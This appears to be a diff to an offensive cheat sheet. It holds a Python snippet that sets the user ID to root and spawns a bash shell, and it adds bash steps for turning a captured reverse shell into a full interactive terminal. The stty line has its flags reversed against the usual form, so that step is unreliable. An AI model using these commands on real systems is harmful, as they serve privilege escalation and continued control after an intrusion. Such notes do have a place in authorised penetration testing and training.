@@ -2,3 +2,9 @@ Python
 import os
 os.setuid(0) 
 os.system("/bin/bash")
+
+BASH
+script /dev/null -c bash
+# Ctrl + z
+stty -raw echo; fg
+# Enter (Return) x2
